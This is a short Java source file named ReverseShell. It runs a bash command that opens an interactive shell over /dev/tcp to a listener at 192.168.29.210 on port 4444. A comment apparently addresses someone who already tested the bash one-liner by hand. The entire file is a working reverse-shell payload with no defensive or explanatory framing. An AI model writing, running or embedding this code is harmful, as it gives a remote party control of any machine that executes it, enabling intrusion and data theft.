import java.io.IOException;

public class ReverseShell {
    public static void main(String[] args) {
        String host = "192.168.29.210";
        int port = 4444;

        // This is exactly the bash command you already tested manually
        String cmd = String.format("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'", host, port);

        try {
            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
